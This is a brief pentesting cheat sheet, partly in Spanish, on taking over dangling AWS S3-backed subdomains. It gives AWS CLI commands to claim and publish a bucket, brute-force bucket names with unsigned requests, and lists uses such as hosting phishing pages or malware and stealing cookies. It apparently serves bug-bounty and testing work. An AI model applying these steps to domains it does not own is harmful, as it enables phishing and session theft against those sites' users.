# AWS

## Subdomain Takeover

> Take control of a domain that was previously associated with a deprovisoned AWS resource is also known as a Subdomain Takover vulnerability 

Crear bucket

* aws s3 mb s3://example.domain.com
* aws s3api create-bucket --bucket example.domain.com --region eu-west-2 --create-bucket-configuration LocationConstraint=eu-west-2

Eliminar bucket

* aws s3 rb s3://example.domain.com --force

Configure bucket

* aws s3api put-bucket-policy --bucket example.domain.com --policy file://policy.json

Upload to bucket

* aws s3 sync ./static/ s3://example.domain.com
* aws s3 cp poc.html s3://domain

Enable public access

* aws s3 website s3://assets.cloudbilling.net/ --index-document index.html --error-document index.html

### Gravity

* Hosting Phishing websites
* Hosting Malware
* Bypassing CSP policies
* Stealing Cookie's
* Man-in-the-browser attacks

## S3 Buckets
* s3.amazonaws.com
* Read: aws s3 ls s3://domain --no-sign-request = Response: An error occurred (NoSuchBucket) when calling the ListObjectsV2 operation: The specified bucket does not exist
* Upload: aws s3 cp poc.html s3://domain --no-sign-request = load to s3://
* Bruteforce: cat subdomains.txt | xargs -I@ sh -c 'aws s3 ls s3://@ --no-sign-request' | grep -v 'An error occurred (NoSuchBucket) when calling the ListObjectsV2 operation: The specified bucket does not exist'
